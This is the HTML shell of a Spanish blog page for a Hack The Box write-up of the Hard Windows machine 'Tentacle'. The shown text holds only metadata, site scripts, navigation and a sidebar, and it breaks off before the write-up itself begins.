<!DOCTYPE html><html class="transition bg-[var(--page-bg)] md:text-[16px] text-[14px]" data-astro-cid-sckkx6r4 data-isHome=false lang=en style=--configHue:270><head><title>Tentacle HTB Writeup - Mil4ne</title><meta charset=UTF-8><meta content="Tentacle es una maquina de dificultad Hard en la cual veremos varias cositas de kerberos y dns." name=description><meta content=Mil4ne name=author><meta content=Mil4ne property=og:site_name><meta content=https://fuwari.vercel.app/posts/tentacle/ property=og:url><meta content="Tentacle HTB Writeup - Mil4ne" property=og:title><meta content="Tentacle es una maquina de dificultad Hard en la cual veremos varias cositas de kerberos y dns." property=og:description><meta content=summary_large_image name=twitter:card><meta content=https://fuwari.vercel.app/posts/tentacle/ property=twitter:url><meta content="Tentacle HTB Writeup - Mil4ne" name=twitter:title><meta content="Tentacle es una maquina de dificultad Hard en la cual veremos varias cositas de kerberos y dns." name=twitter:description><meta content="width=device-width" name=viewport><meta content="Astro v4.11.0" name=generator><link href=/favicon/icon.png rel=icon media="(prefers-color-scheme: dark)" sizes=32x32><script>!function(){switch(localStorage.getItem("theme")||"auto"){case"light":document.documentElement.classList.remove("dark");break;case"dark":document.documentElement.classList.add("dark");break;case"auto":window.matchMedia("(prefers-color-scheme: dark)").matches?document.documentElement.classList.add("dark"):document.documentElement.classList.remove("dark")}}()</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Tentacle HTB Writeup","description":"Tentacle es una maquina de dificultad Hard en la cual veremos varias cositas de kerberos y dns.","keywords":["Windows","Hard"],"author":{"@type":"Person","name":"Mil4ne","url":"https://fuwari.vercel.app/"},"datePublished":"2024-08-08"}</script><link href=https://cdn.staticfile.org/KaTeX/0.16.9/katex.min.css rel=stylesheet crossorigin=anonymous integrity=sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI+WdtXRGWt2kTvGFasHpSy3SV><link href=https://fuwari.vercel.app/rss.xml rel=alternate title=Mil4ne type=application/rss+xml><link href=/_astro/hoisted.aW6J7aTb.css rel=stylesheet><style>#post-container :first-child{animation-delay:calc(var(--content-delay) + 0ms)}#post-container :nth-child(2){animation-delay:calc(var(--content-delay) + 50ms)}#post-container :nth-child(3){animation-delay:calc(var(--content-delay) + .1s)}#post-container :nth-child(4){animation-delay:calc(var(--content-delay) + 175ms)}#post-container :nth-child(5){animation-delay:calc(var(--content-delay) + .25s)}#post-container :nth-child(6){animation-delay:calc(var(--content-delay) + 325ms)}</style><link href=/_astro/_page_.Cqgg-kM5.css rel=stylesheet><link href=/_astro/_page_.DImNEAs0.css rel=stylesheet><link href=/_astro/about.B4ABUC8K.css rel=stylesheet><link href=/_astro/_category_.vxujU0QL.css rel=stylesheet><style>#display-setting.svelte-3akcb9 input[type=range].svelte-3akcb9{-webkit-appearance:none;height:1.5rem;background-image:var(--color-selection-bar);transition:background-image .15s ease-in-out}#display-setting.svelte-3akcb9 .svelte-3akcb9::-webkit-slider-thumb{-webkit-appearance:none;height:1rem;width:.5rem;border-radius:.125rem;background:#ffffffb3;box-shadow:none}#display-setting.svelte-3akcb9 .svelte-3akcb9::-webkit-slider-thumb:hover{background:#fffc}#display-setting.svelte-3akcb9 .svelte-3akcb9::-webkit-slider-thumb:active{background:#fff9}#display-setting.svelte-3akcb9 .svelte-3akcb9::-moz-range-thumb{-webkit-appearance:none;height:1rem;width:.5rem;border-radius:.125rem;border-width:0;background:#ffffffb3;box-shadow:none}#display-setting.svelte-3akcb9 .svelte-3akcb9::-moz-range-thumb:hover{background:#fffc}#display-setting.svelte-3akcb9 .svelte-3akcb9::-moz-range-thumb:active{background:#fff9}#display-setting.svelte-3akcb9.svelte-3akcb9::-ms-thumb{-webkit-appearance:none;height:1rem;width:.5rem;border-radius:.125rem;background:#ffffffb3;box-shadow:none}#display-setting.svelte-3akcb9.svelte-3akcb9::-ms-thumb:hover{background:#fffc}#display-setting.svelte-3akcb9.svelte-3akcb9::-ms-thumb:active{background:#fff9}</style><script type=module src=/_astro/hoisted.DaJ843G5.js></script><script type=module src=/_astro/page.3zT6KwRv.js></script></head><body class="transition min-h-screen" data-astro-cid-sckkx6r4 style=--configHue:270><div id=config-carrier data-hue=270></div><div><div class="w-full absolute" id=banner-wrapper style=--configHue:270 data-astro-cid-sckkx6r4><div class="overflow-hidden relative h-full hidden object-center object-cover"><div class="transition absolute pointer-events-none bg-opacity-50 dark:bg-black/10 inset-0"></div><img alt="Banner image of the blog" decoding=async height=506 loading=lazy src=/_astro/main.BGOttbhW_CEd3.webp width=506 class="w-full h-full object-cover" style=object-position:center></div></div><div class="relative mx-auto gap-4 grid grid-cols-[17.5rem_auto] grid-rows-[auto_auto_1fr_auto] lg:grid-rows-[auto_1fr_auto] max-w-[var(--page-width)] md:px-4 min-h-screen px-0"><div class="onload-animation col-span-2 grid-rows-1 z-50" id=top-row><div class="transition absolute -top-8 bg-[var(--card-bg)] h-8 left-0 right-0"></div><div class="flex items-center justify-between card-base h-[4.5rem] max-w-[var(--page-width)] mx-auto overflow-visible px-4 rounded-t-none sticky top-0"><a href=/ class="rounded-lg btn-plain scale-animation active:scale-95 font-bold px-5 h-[3.25rem]"><div class="flex items-center flex-row text-[var(--primary)] text-md"><svg data-icon=material-symbols:home-outline-rounded height=1em viewBox="0 0 24 24" width=1em class="text-[1.75rem] mb-1 mr-2"><symbol id=ai:material-symbols:home-outline-rounded><path d="M6 19h3v-5q0-.425.288-.712T10 13h4q.425 0 .713.288T15 14v5h3v-9l-6-4.5L6 10zm-2 0v-9q0-.475.213-.9t.587-.7l6-4.5q.525-.4 1.2-.4t1.2.4l6 4.5q.375.275.588.7T20 10v9q0 .825-.588 1.413T18 21h-4q-.425 0-.712-.288T13 20v-5h-2v5q0 .425-.288.713T10 21H6q-.825 0-1.412-.587T4 19m8-6.75" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:home-outline-rounded></use></svg> Mil4ne</div></a><div class="md:flex hidden"><a href=/ class="rounded-lg btn-plain scale-animation active:scale-95 font-bold px-5 h-11" aria-label=Home><div class="flex items-center">Home</div></a><a href=/archive/ class="rounded-lg btn-plain scale-animation active:scale-95 font-bold px-5 h-11" aria-label=Archivos><div class="flex items-center">Archivos</div></a><a href=/project/ class="rounded-lg btn-plain scale-animation active:scale-95 font-bold px-5 h-11" aria-label=Proyectos><div class="flex items-center">Proyectos</div></a><a href=/about/ class="rounded-lg btn-plain scale-animation active:scale-95 font-bold px-5 h-11" aria-label="Sobre mi"><div class="flex items-center">Sobre mi</div></a></div><div class=flex><style>astro-island,astro-slot,astro-static-slot{display:contents}</style><script>(self.Astro||(self.Astro={})).load=async t=>{await(await t())()},window.dispatchEvent(new Event("astro:load")),(()=>{var t=Object.defineProperty,e=(e,r,n)=>((e,r,n)=>r in e?t(e,r,{enumerable:!0,configurable:!0,writable:!0,value:n}):e[r]=n)(e,"symbol"!=typeof r?r+"":r,n);{let t={0:t=>s(t),1:t=>n(t),2:t=>new RegExp(t),3:t=>new Date(t),4:t=>new Map(n(t)),5:t=>new Set(n(t)),6:t=>BigInt(t),7:t=>new URL(t),8:t=>new Uint8Array(t),9:t=>new Uint16Array(t),10:t=>new Uint32Array(t)},r=e=>{let[r,n]=e;return r in t?t[r](n):void 0},n=t=>t.map(r),s=t=>"object"!=typeof t||null===t?t:Object.fromEntries(Object.entries(t).map((([t,e])=>[t,r(e)])));class i extends HTMLElement{constructor(){super(...arguments),e(this,"Component"),e(this,"hydrator"),e(this,"hydrate",(async()=>{var t;if(!this.hydrator||!this.isConnected)return;let e=null==(t=this.parentElement)?void 0:t.closest("astro-island[ssr]");if(e)return void e.addEventListener("astro:hydrate",this.hydrate,{once:!0});let r,n=this.querySelectorAll("astro-slot"),i={},o=this.querySelectorAll("template[data-astro-template]");for(let t of o){let e=t.closest(this.tagName);null!=e&&e.isSameNode(this)&&(i[t.getAttribute("data-astro-template")||"default"]=t.innerHTML,t.remove())}for(let t of n){let e=t.closest(this.tagName);null!=e&&e.isSameNode(this)&&(i[t.getAttribute("name")||"default"]=t.innerHTML)}try{r=this.hasAttribute("props")?s(JSON.parse(this.getAttribute("props"))):{}}catch(t){let e=this.getAttribute("component-url")||"<unknown>",r=this.getAttribute("component-export");throw r&&(e+=` (export ${r})`),console.error(`[hydrate] Error parsing props for component ${e}`,this.getAttribute("props"),t),t}await this.hydrator(this)(this.Component,r,i,{client:this.getAttribute("client")}),this.removeAttribute("ssr"),this.dispatchEvent(new CustomEvent("astro:hydrate"))})),e(this,"unmount",(()=>{this.isConnected||this.dispatchEvent(new CustomEvent("astro:unmount"))}))}disconnectedCallback(){document.removeEventListener("astro:after-swap",this.unmount),document.addEventListener("astro:after-swap",this.unmount,{once:!0})}connectedCallback(){if(this.hasAttribute("await-children")&&"interactive"!==document.readyState&&"complete"!==document.readyState){let t=()=>{document.removeEventListener("DOMContentLoaded",t),e.disconnect(),this.childrenConnectedCallback()},e=new MutationObserver((()=>{var e;(null==(e=this.lastChild)?void 0:e.nodeType)===Node.COMMENT_NODE&&"astro:end"===this.lastChild.nodeValue&&(this.lastChild.remove(),t())}));e.observe(this,{childList:!0}),document.addEventListener("DOMContentLoaded",t)}else this.childrenConnectedCallback()}async childrenConnectedCallback(){let t=this.getAttribute("before-hydration-url");t&&await import(t),this.start()}async start(){let t=JSON.parse(this.getAttribute("opts")),e=this.getAttribute("client");if(void 0!==Astro[e])try{await Astro[e]((async()=>{let t=this.getAttribute("renderer-url"),[e,{default:r}]=await Promise.all([import(this.getAttribute("component-url")),t?import(t):()=>()=>{}]),n=this.getAttribute("component-export")||"default";if(n.includes(".")){this.Component=e;for(let t of n.split("."))this.Component=this.Component[t]}else this.Component=e[n];return this.hydrator=r,this.hydrate}),t,this)}catch(t){console.error(`[astro-island] Error hydrating ${this.getAttribute("component-url")}`,t)}else window.addEventListener(`astro:${e}`,(()=>this.start()),{once:!0})}attributeChangedCallback(){this.hydrate()}}e(i,"observedAttributes",["props"]),customElements.get("astro-island")||customElements.define("astro-island",i)}})()</script><astro-island await-children="" client=load component-export=default component-url=/_astro/Search.oF6B5C8F.js opts={&quot;name&quot;:&quot;Search&quot;,&quot;value&quot;:true} props={} renderer-url=/_astro/client.Cx1FBVJX.js ssr="" uid=GD7F5><div class="rounded-lg items-center bg-black/[0.04] dark:bg-white/5 dark:focus-within:bg-white/10 dark:hover:bg-white/10 focus-within:bg-black/[0.06] h-11 hidden hover:bg-black/[0.06] lg:flex mr-2 transition-all" id=search-bar><astro-slot name=search-icon><svg data-icon=material-symbols:search height=1em viewBox="0 0 24 24" width=1em class="transition absolute pointer-events-none dark:text-white/30 ml-3 my-auto text-[1.25rem] text-black/30" slot=search-icon><symbol id=ai:material-symbols:search><path d="m19.6 21l-6.3-6.3q-.75.6-1.725.95T9.5 16q-2.725 0-4.612-1.888T3 9.5t1.888-4.612T9.5 3t4.613 1.888T16 9.5q0 1.1-.35 2.075T14.7 13.3l6.3 6.3zM9.5 14q1.875 0 3.188-1.312T14 9.5t-1.312-3.187T9.5 5T6.313 6.313T5 9.5t1.313 3.188T9.5 14" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:search></use></svg></astro-slot><input class="text-sm bg-transparent dark:text-white/50 focus:w-60 outline-0 pl-10 text-black/50 active:w-60 h-full transition-all w-40" placeholder="$ Grep" value=""></div><button class="rounded-lg btn-plain scale-animation h-11 active:scale-90 w-11 lg:hidden" aria-label="Search Panel" id=search-switch><astro-slot name=search-switch><svg data-icon=material-symbols:search height=1em viewBox="0 0 24 24" width=1em class=text-[1.25rem] slot=search-switch><use xlink:href=#ai:material-symbols:search></use></svg></astro-slot></button><div class="absolute float-panel-closed float-panel right-4 left-4 md:left-[unset] md:w-[30rem] p-2 rounded-2xl search-panel shadow-2xl top-20" id=search-panel><div class="flex items-center relative bg-black/[0.04] dark:bg-white/5 dark:focus-within:bg-white/10 dark:hover:bg-white/10 focus-within:bg-black/[0.06] h-11 hover:bg-black/[0.06] lg:hidden rounded-xl transition-all" id=search-bar-inside><astro-slot name=search-icon><svg data-icon=material-symbols:search height=1em viewBox="0 0 24 24" width=1em class="transition absolute pointer-events-none dark:text-white/30 ml-3 my-auto text-[1.25rem] text-black/30" slot=search-icon><symbol id=ai:material-symbols:search><path d="m19.6 21l-6.3-6.3q-.75.6-1.725.95T9.5 16q-2.725 0-4.612-1.888T3 9.5t1.888-4.612T9.5 3t4.613 1.888T16 9.5q0 1.1-.35 2.075T14.7 13.3l6.3 6.3zM9.5 14q1.875 0 3.188-1.312T14 9.5t-1.312-3.187T9.5 5T6.313 6.313T5 9.5t1.313 3.188T9.5 14" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:search></use></svg></astro-slot><input class="text-sm bg-transparent dark:text-white/50 focus:w-60 outline-0 pl-10 text-black/50 absolute inset-0" placeholder=Search value=""></div></div><template data-astro-template=arrow-icon><svg data-icon=fa6-solid:chevron-right height=1em viewBox="0 0 320 512" width=0.63em class="transition text-[var(--primary)] my-auto text=[0.75rem] translate-x-0.5" slot=arrow-icon><symbol id=ai:fa6-solid:chevron-right><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256L73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z" fill=currentColor /></symbol><use xlink:href=#ai:fa6-solid:chevron-right></use></svg></template></astro-island><astro-island await-children="" client=load component-export=default component-url=/_astro/LightDarkSwitch.B5A2M5Vx.js opts={&quot;name&quot;:&quot;LightDarkSwitch&quot;,&quot;value&quot;:true} props={} renderer-url=/_astro/client.Cx1FBVJX.js ssr="" uid=1l6cYY><div class="relative z-50" role=menu tabindex=-1><button class="rounded-lg btn-plain scale-animation h-11 active:scale-90 w-11 relative" aria-label="Light/Dark Mode" id=scheme-switch role=menuitem><div class="absolute opacity-0"></div><div class="absolute opacity-0"></div><div class=absolute></div></button><div class="transition absolute -right-2 float-panel-closed hidden lg:block pt-5 top-11" id=light-dark-panel><div class="card-base float-panel p-2"><button class="transition flex items-center rounded-lg active:scale-95 btn-plain font-medium h-9 justify-start px-3 scale-animation w-full whitespace-nowrap mb-0.5">Claro</button> <button class="transition flex items-center rounded-lg active:scale-95 btn-plain font-medium h-9 justify-start px-3 scale-animation w-full whitespace-nowrap mb-0.5">Oscuro</button> <button class="transition flex items-center rounded-lg active:scale-95 btn-plain font-medium h-9 justify-start px-3 scale-animation w-full whitespace-nowrap current-theme-btn">Sistema</button></div></div></div></astro-island><button class="rounded-lg btn-plain scale-animation h-11 active:scale-90 w-11 md:hidden" aria-label=Menu id=nav-menu-switch name="Nav Menu"><svg data-icon=material-symbols:menu-rounded height=1em viewBox="0 0 24 24" width=1em class=text-[1.25rem]><use xlink:href=#ai:material-symbols:menu-rounded></use></svg></button></div><div class="absolute float-panel-closed float-panel right-4 fixed px-2 py-2 transition-all" id=nav-menu-panel><a href=/ class="transition flex items-center rounded-lg active:bg-[var(--btn-plain-bg-active)] gap-8 group hover:bg-[var(--btn-plain-bg-hover)] justify-between pl-3 pr-1 py-2"><div class="transition font-bold dark:text-white/75 group-active:text-[var(--primary)] group-hover:text-[var(--primary)] text-black/75">Home</div><svg data-icon=material-symbols:chevron-right-rounded height=1em viewBox="0 0 24 24" width=1em class="transition text-[1.25rem] text-[var(--primary)]"><use xlink:href=#ai:material-symbols:chevron-right-rounded></use></svg> </a><a href=/archive/ class="transition flex items-center rounded-lg active:bg-[var(--btn-plain-bg-active)] gap-8 group hover:bg-[var(--btn-plain-bg-hover)] justify-between pl-3 pr-1 py-2"><div class="transition font-bold dark:text-white/75 group-active:text-[var(--primary)] group-hover:text-[var(--primary)] text-black/75">Archivos</div><svg data-icon=material-symbols:chevron-right-rounded height=1em viewBox="0 0 24 24" width=1em class="transition text-[1.25rem] text-[var(--primary)]"><use xlink:href=#ai:material-symbols:chevron-right-rounded></use></svg> </a><a href=/project/ class="transition flex items-center rounded-lg active:bg-[var(--btn-plain-bg-active)] gap-8 group hover:bg-[var(--btn-plain-bg-hover)] justify-between pl-3 pr-1 py-2"><div class="transition font-bold dark:text-white/75 group-active:text-[var(--primary)] group-hover:text-[var(--primary)] text-black/75">Proyectos</div><svg data-icon=material-symbols:chevron-right-rounded height=1em viewBox="0 0 24 24" width=1em class="transition text-[1.25rem] text-[var(--primary)]"><use xlink:href=#ai:material-symbols:chevron-right-rounded></use></svg> </a><a href=/about/ class="transition flex items-center rounded-lg active:bg-[var(--btn-plain-bg-active)] gap-8 group hover:bg-[var(--btn-plain-bg-hover)] justify-between pl-3 pr-1 py-2"><div class="transition font-bold dark:text-white/75 group-active:text-[var(--primary)] group-hover:text-[var(--primary)] text-black/75">Sobre mi</div><svg data-icon=material-symbols:chevron-right-rounded height=1em viewBox="0 0 24 24" width=1em class="transition text-[1.25rem] text-[var(--primary)]"><use xlink:href=#ai:material-symbols:chevron-right-rounded></use></svg></a></div><script>(self.Astro||(self.Astro={})).only=async t=>{await(await t())()},window.dispatchEvent(new Event("astro:only"))</script><astro-island await-children="" client=only component-export=default component-url=/_astro/DisplaySettings.BbR0fAju.js opts={&quot;name&quot;:&quot;DisplaySettings&quot;,&quot;value&quot;:&quot;svelte&quot;} props={} renderer-url=/_astro/client.Cx1FBVJX.js ssr="" uid=1IwgJN><template data-astro-template=restore-icon><svg data-icon=fa6-solid:arrow-rotate-left height=1em viewBox="0 0 512 512" width=1em class=text-[0.875rem] slot=restore-icon><symbol id=ai:fa6-solid:arrow-rotate-left><path d="M125.7 160H176c17.7 0 32 14.3 32 32s-14.3 32-32 32H48c-17.7 0-32-14.3-32-32V64c0-17.7 14.3-32 32-32s32 14.3 32 32v51.2l17.6-17.6c87.5-87.5 229.3-87.5 316.8 0s87.5 229.3 0 316.8s-229.3 87.5-316.8 0c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0c62.5 62.5 163.8 62.5 226.3 0s62.5-163.8 0-226.3s-163.8-62.5-226.3 0z" fill=currentColor /></symbol><use xlink:href=#ai:fa6-solid:arrow-rotate-left></use></svg></template></astro-island></div><script>!async function(){const i=await import("/pagefind/pagefind.js");await i.options({excerptLength:20}),i.init(),window.pagefind=i,i.search("")}()</script></div><div class="w-full col-span-2 lg:col-span-1 lg:max-w-[17.5rem] lg:row-end-3 lg:row-start-2 onload-animation row-end-4 row-start-3" id=sidebar><div class="flex w-full gap-4 flex-col mb-4"><div class="card-base p-3"><a href=/about/ class="overflow-hidden relative lg:mt-0 mx-auto active:scale-95 block group lg:max-w-none lg:mx-0 max-w-[240px] mb-3 mt-1 rounded-xl" aria-label="Go to About Page"><div class="transition flex items-center justify-center absolute group-active:bg-black/50 group-hover:bg-black/30 h-full pointer-events-none w-full z-50"><svg data-icon=fa6-regular:address-card height=1em viewBox="0 0 576 512" width=1.13em class="transition group-hover:opacity-100 group-hover:scale-100 opacity-0 scale-90 text-5xl text-white"><symbol id=ai:fa6-regular:address-card><path d="M512 80c8.8 0 16 7.2 16 16v320c0 8.8-7.2 16-16 16H64c-8.8 0-16-7.2-16-16V96c0-8.8 7.2-16 16-16zM64 32C28.7 32 0 60.7 0 96v320c0 35.3 28.7 64 64 64h448c35.3 0 64-28.7 64-64V96c0-35.3-28.7-64-64-64zm144 224a64 64 0 1 0 0-128a64 64 0 1 0 0 128m-32 32c-44.2 0-80 35.8-80 80c0 8.8 7.2 16 16 16h192c8.8 0 16-7.2 16-16c0-44.2-35.8-80-80-80zm200-144c-13.3 0-24 10.7-24 24s10.7 24 24 24h80c13.3 0 24-10.7 24-24s-10.7-24-24-24zm0 96c-13.3 0-24 10.7-24 24s10.7 24 24 24h80c13.3 0 24-10.7 24-24s-10.7-24-24-24z" fill=currentColor /></symbol><use xlink:href=#ai:fa6-regular:address-card></use></svg></div><div class="overflow-hidden relative h-full lg:mt-0 lg:w-full mx-auto"><div class="transition absolute pointer-events-none bg-opacity-50 dark:bg-black/10 inset-0"></div><img alt="Profile Image of the Author" decoding=async height=506 loading=lazy src=/_astro/main.BGOttbhW_CEd3.webp width=506 class="w-full h-full object-cover" style=object-position:center></div></a><div class=px-2><div class="transition font-bold dark:text-neutral-50 mb-1 text-center text-xl">Mil4ne</div><div class="transition mb-2 bg-[var(--primary)] h-1 mx-auto rounded-full w-5"></div><div class="transition text-center mb-2.5 text-neutral-400">#RoadToCBBH</div><div class="flex gap-2 justify-center mb-1"><a href=https://app.hackthebox.com/profile/1022508 class="rounded-lg btn-regular active:scale-90 h-10 w-10" aria-label=HackTheBox rel=me target=_blank><svg data-icon=carbon:cube height=1em viewBox="0 0 32 32" width=1em class=text-[1.5rem]><symbol id=ai:carbon:cube><path d="m28.504 8.136l-12-7a1 1 0 0 0-1.008 0l-12 7A1 1 0 0 0 3 9v14a1 1 0 0 0 .496.864l12 7a1 1 0 0 0 1.008 0l12-7A1 1 0 0 0 29 23V9a1 1 0 0 0-.496-.864M16 3.158L26.016 9L16 14.842L5.984 9ZM5 10.74l10 5.833V28.26L5 22.426Zm12 17.52V16.574l10-5.833v11.685Z" fill=currentColor /></symbol><use xlink:href=#ai:carbon:cube></use></svg> </a><a href=https://linkedin.com/in/mil4ne class="rounded-lg btn-regular active:scale-90 h-10 w-10" aria-label=Linkedin rel=me target=_blank><svg data-icon=carbon:logo-linkedin height=1em viewBox="0 0 32 32" width=1em class=text-[1.5rem]><symbol id=ai:carbon:logo-linkedin><path d="M26.2 4H5.8C4.8 4 4 4.8 4 5.7v20.5c0 .9.8 1.7 1.8 1.7h20.4c1 0 1.8-.8 1.8-1.7V5.7c0-.9-.8-1.7-1.8-1.7M11.1 24.4H7.6V13h3.5zm-1.7-13c-1.1 0-2.1-.9-2.1-2.1s.9-2.1 2.1-2.1c1.1 0 2.1.9 2.1 2.1s-1 2.1-2.1 2.1m15.1 12.9H21v-5.6c0-1.3 0-3.1-1.9-3.1S17 17.1 17 18.5v5.7h-3.5V13h3.3v1.5h.1c.5-.9 1.7-1.9 3.4-1.9c3.6 0 4.3 2.4 4.3 5.5v6.2z" fill=currentColor /></symbol><use xlink:href=#ai:carbon:logo-linkedin></use></svg> </a><a href=https://github.com/mil4ne class="rounded-lg btn-regular active:scale-90 h-10 w-10" aria-label=GitHub rel=me target=_blank><svg data-icon=fa6-brands:github height=1em viewBox="0 0 496 512" width=0.97em class=text-[1.5rem]><symbol id=ai:fa6-brands:github><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6c-3.3.3-5.6-1.3-5.6-3.6c0-2 2.3-3.6 5.2-3.6c3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9c2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9c.3 2 2.9 3.3 5.9 2.6c2.9-.7 4.9-2.6 4.6-4.6c-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2c12.8 2.3 17.3-5.6 17.3-12.1c0-6.2-.3-40.4-.3-61.4c0 0-70 15-84.7-29.8c0 0-11.4-29.1-27.8-36.6c0 0-22.9-15.7 1.6-15.4c0 0 24.9 2 38.6 25.8c21.9 38.6 58.6 27.5 72.9 20.9c2.3-16 8.8-27.1 16-33.7c-55.9-6.2-112.3-14.3-112.3-110.5c0-27.5 7.6-41.3 23.6-58.9c-2.6-6.5-11.1-33.3 2.6-67.9c20.9-6.5 69 27 69 27c20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27c13.7 34.7 5.2 61.4 2.6 67.9c16 17.7 25.8 31.5 25.8 58.9c0 96.5-58.9 104.2-114.8 110.5c9.2 7.9 17 22.9 17 46.4c0 33.7-.3 75.4-.3 83.6c0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252C496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2c1.6 1.6 3.9 2.3 5.2 1c1.3-1 1-3.3-.7-5.2c-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9c1.6 1 3.6.7 4.3-.7c.7-1.3-.3-2.9-2.3-3.9c-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2c2.3 2.3 5.2 2.6 6.5 1c1.3-1.3.7-4.3-1.3-6.2c-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9c1.6 2.3 4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2c-1.4-2.3-4-3.3-5.6-2" fill=currentColor /></symbol><use xlink:href=#ai:fa6-brands:github></use></svg></a></div></div></div></div><div class="flex w-full gap-4 flex-col top-4 top-4 sticky"><widget-layout class="onload-animation card-base pb-4" data-astro-cid-ucso7hve data-id=categories data-is-collapsed=false style=animation-delay:150ms;--collapsedHeight:7.5rem><div class="transition font-bold before:absolute before:bg-[var(--primary)] before:rounded-md before:h-4 before:left-[-16px] before:top-[5.5px] before:w-1 dark:text-neutral-100 mb-2 ml-8 mt-4 relative text-lg text-neutral-900" style=--collapsedHeight:7.5rem data-astro-cid-ucso7hve>Categorias</div><div class="overflow-hidden collapse-wrapper px-4" id=categories style=--collapsedHeight:7.5rem data-astro-cid-ucso7hve><a href=/archive/category/HackTheBox/ aria-label="View all posts in the HackTheBox category"><button class="rounded-lg active:bg-[var(--btn-plain-bg-active)] hover:bg-[var(--btn-plain-bg-hover)] bg-none dark:hover:text-[var(--primary)] dark:text-neutral-300 h-10 hover:pl-3 hover:text-[var(--primary)] pl-2 text-neutral-700 transition-all w-full"><div class="flex items-center justify-between mr-2 relative"><div class="overflow-hidden overflow-ellipsis whitespace-nowrap text-left">HackTheBox</div><div class="transition flex items-center rounded-lg bg-[oklch(0.95_0.025_var(--hue))] dark:bg-[var(--primary)] dark:text-[var(--deep-text)] font-bold h-7 justify-center min-w-[2rem] ml-4 text-[var(--btn-content)] text-sm">18</div></div></button></a></div></widget-layout><widget-layout class="onload-animation card-base pb-4" data-astro-cid-ucso7hve data-id=tags data-is-collapsed=false style=animation-delay:.2s;--collapsedHeight:7.5rem><div class="transition font-bold before:absolute before:bg-[var(--primary)] before:rounded-md before:h-4 before:left-[-16px] before:top-[5.5px] before:w-1 dark:text-neutral-100 mb-2 ml-8 mt-4 relative text-lg text-neutral-900" style=--collapsedHeight:7.5rem data-astro-cid-ucso7hve>Tags</div><div class="overflow-hidden collapse-wrapper px-4" id=tags style=--collapsedHeight:7.5rem data-astro-cid-ucso7hve><div class="flex flex-wrap gap-2"><a href=/archive/tag/Easy/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Easy tag">Easy </a><a href=/archive/tag/Hard/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Hard tag">Hard </a><a href=/archive/tag/Linux/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Linux tag">Linux </a><a href=/archive/tag/Medium/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Medium tag">Medium </a><a href=/archive/tag/Windows/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Windows tag">Windows</a></div></div></widget-layout></div></div><div class="overflow-hidden onload-animation col-span-2 lg:col-span-1 row-end-3 row-start-2" id=content-wrapper><main class=transition-fade id=swup><div class="flex w-full mb-4 overflow-hidden relative rounded-[var(--radius-large)]"><div class="w-full relative card-base md:px-9 pb-4 pt-6 px-6 z-10" id=post-container><div class="transition flex dark:text-white/30 flex-row gap-5 mb-3 onload-animation text-black/30"><div class="flex items-center flex-row"><div class="transition flex items-center justify-center bg-black/5 dark:bg-white/10 dark:text-white/50 h-6 mr-2 rounded-md text-black/50 w-6"><svg data-icon=material-symbols:notes-rounded height=1em viewBox="0 0 24 24" width=1em><symbol id=ai:material-symbols:notes-rounded><path d="M4 18q-.425 0-.712-.288T3 17t.288-.712T4 16h10q.425 0 .713.288T15 17t-.288.713T14 18zm0-5q-.425 0-.712-.288T3 12t.288-.712T4 11h16q.425 0 .713.288T21 12t-.288.713T20 13zm0-5q-.425 0-.712-.288T3 7t.288-.712T4 6h16q.425 0 .713.288T21 7t-.288.713T20 8z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:notes-rounded></use></svg></div><div class=text-sm>2556 Palabras</div></div><div class="flex items-center flex-row"><div class="transition flex items-center justify-center bg-black/5 dark:bg-white/10 dark:text-white/50 h-6 mr-2 rounded-md text-black/50 w-6"><svg data-icon=material-symbols:schedule-outline-rounded height=1em viewBox="0 0 24 24" width=1em><symbol id=ai:material-symbols:schedule-outline-rounded><path d="M13 11.6V8q0-.425-.288-.712T12 7t-.712.288T11 8v3.975q0 .2.075.388t.225.337l3.3 3.3q.275.275.7.275T16 16t.275-.7t-.275-.7zM12 22q-2.075 0-3.9-.788t-3.175-2.137T2.788 15.9T2 12t.788-3.9t2.137-3.175T8.1 2.788T12 2t3.9.788t3.175 2.137T21.213 8.1T22 12t-.788 3.9t-2.137 3.175t-3.175 2.138T12 22m0-2q3.325 0 5.663-2.337T20 12t-2.337-5.663T12 4T6.337 6.338T4 12t2.338 5.663T12 20" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:schedule-outline-rounded></use></svg></div><div class=text-sm>13 minutos</div></div></div><div class="relative onload-animation"><div class="transition font-bold before:absolute before:bg-[var(--primary)] before:rounded-md before:h-5 before:left-[-1.125rem] before:top-[0.75rem] block dark:text-white/90 mb-3 md:before:w-1 md:text-[2.5rem]/[2.75rem] text-3xl text-black/90 w-full" 